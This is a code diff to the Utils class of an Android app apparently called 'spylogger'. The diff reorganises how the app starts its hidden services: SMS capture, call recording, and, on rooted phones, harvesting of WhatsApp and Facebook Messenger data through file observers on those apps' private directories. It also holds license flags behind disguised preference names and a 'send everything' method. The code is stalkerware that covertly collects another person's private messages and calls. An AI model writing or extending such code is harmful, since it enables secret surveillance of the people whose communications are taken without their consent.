@@ -23,6 +23,8 @@ import android.webkit.MimeTypeMap;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
+import com.gravatasufoca.spylogger.helpers.MensageiroAsyncHelper;
+import com.gravatasufoca.spylogger.helpers.MensageiroObserversHelper;
 import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
@@ -76,7 +78,7 @@ import java.util.zip.ZipOutputStream;
 
 public class Utils {
 
-    public static final String PRIMEIRA_CARGA="PRIMEIRA_CARGA";
+    public static final String MENSAGEM_RECEBIDA="MENSAGEM_RECEBIDA";
     public static final byte[] SALT = new byte[]{-32, 58, -52, 48, 15, -124, 123, 64, 60, -44, -122, -91, -23, 53, -23, 123, 44, -123, -111, 43};
 
     public static final String FACEBOOK_DIR_PATH = android.os.Environment.getDataDirectory().toString() + "/data/com.messenger.orca";
@@ -119,15 +121,13 @@ public class Utils {
     public static final long MAX_SIZE = 26214400;
     public static Alarm alarm;
     private static PendingIntent pendingIntent;
-    public static FileObserver whatsObserver;
-    public static FileObserver faceObserver;
     public static boolean verificado = false;
     public static boolean licenciado = false;
     public static String PREF = "jabi";
     public static String COMPRADO = "potoca";
     public static String serverURL;
 
-    public static Context context;
+//    public static Context context;
     public static FileObserver observer;
 
     public static String getDeviceId(ContentResolver contentResolver) {
@@ -544,8 +544,8 @@ public class Utils {
     }
 
 
-    public static Contact getContato(String userKey) throws SQLException {
-        Dao<Contact, Integer> dao = (new DatabaseHelperFacebookContacts(Utils.context)).getContatosDao();
+    public static Contact getContato(Context context,String userKey) throws SQLException {
+        Dao<Contact, Integer> dao = (new DatabaseHelperFacebookContacts(context)).getContatosDao();
         String id = "";
         if (userKey.indexOf(":") != -1)
             id = userKey.replaceAll("\\D", "").trim();
@@ -560,13 +560,7 @@ public class Utils {
     }
 
     public static boolean isServiceRunning(Context context) {
-        boolean check = true;
-        if (rooted && !(Utilidades.isServiceRunning(WhatsAppService.class, context) && Utilidades.isServiceRunning(MessengerService.class, context))) {
-            check = false;
-        }
-
-        return check
-                && Utilidades.isServiceRunning(RecordService.class, context)
+        return  Utilidades.isServiceRunning(RecordService.class, context)
                 && Utilidades.isServiceRunning(SmsService.class, context);
     }
 
@@ -596,42 +590,27 @@ public class Utils {
 
 
     // Start the service
-    public static void startNewService(Context context, Configuracao configuracao) {
+    public static void iniciarServicos(Context context, Configuracao configuracao) {
         if (!Utils.isServiceRunning(context)) {
-            if (rooted) {
-                startWhats(context,false);
-            }
             startServices(context);
+        }
+        if (rooted) {
+            new MensageiroObserversHelper(context).start();
         }
         startAlarm(context, configuracao);
     }
 
     public static void primeiroStart(Context context, Configuracao configuracao) {
        if (rooted){
-           startWhats(context,true);
+           new MensageiroAsyncHelper(context).execute(new WhatsAppService(context),new MessengerService(context));
+           new MensageiroObserversHelper(context).start();
        }
-        startAlarm(context, configuracao);
+       startAlarm(context, configuracao);
     }
 
     public static void startServices(Context context) {
         context.startService(new Intent(context, SmsService.class));
         context.startService(new Intent(context, RecordService.class));
-    }
-
-    public static void startWhats(Context context,boolean primeiraVez){
-        if(rooted && !Utilidades.isServiceRunning(WhatsAppService.class, context)) {
-            Intent intent = new Intent(context, WhatsAppService.class);
-            intent.putExtra("primeiraVez", primeiraVez);
-            context.startService(intent);
-        }
-    }
-
-    public static void startFace(Context context,boolean primeiraVez){
-        if(rooted && !Utilidades.isServiceRunning(MessengerService.class, context)) {
-            Intent intent=new Intent(context, MessengerService.class);
-            intent.putExtra("primeiraVez",primeiraVez);
-            context.startService(intent);
-        }
     }
 
     public static void enviarTudo(Context context) {
